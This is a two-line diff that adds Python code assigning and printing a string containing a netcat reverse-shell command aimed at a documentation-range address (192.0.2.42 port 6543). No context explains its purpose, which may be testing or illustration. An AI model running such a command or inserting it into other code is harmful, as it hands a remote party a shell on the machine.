@@ -1,0 +1,2 @@
+payload = "/usr/bin/nc 192.0.2.42 6543 -e /bin/bash"
+print(payload)
